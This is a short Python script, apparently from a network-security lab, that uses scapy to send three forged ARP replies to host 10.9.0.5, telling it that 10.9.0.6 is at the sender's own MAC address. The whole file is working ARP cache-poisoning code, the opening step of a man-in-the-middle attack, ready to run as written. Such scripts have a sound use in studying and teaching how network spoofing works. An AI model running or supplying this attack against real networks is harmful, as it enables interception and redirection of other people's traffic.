#!/usr/bin/env python3
from scapy.all import *

IP_A="10.9.0.5"; MAC_A="02:42:0a:09:00:05"
IP_B="10.9.0.6"
iface="eth0"
MAC_M=get_if_hwaddr(iface)

# "B is at M" → tell A via ARP reply
pkt = Ether(dst=MAC_A)/ARP(
    op=2,              # ARP reply
    psrc=IP_B,         # protocol src: B's IP
    hwsrc=MAC_M,       # claimed MAC: M's
    pdst=IP_A,         # target IP: A
    hwdst=MAC_A        # target MAC: A
)
sendp(pkt, iface=iface, count=3, inter=0.3, verbose=False)
print("Sent unsolicited ARP REPLY to A: 10.9.0.6 is-at", MAC_M)
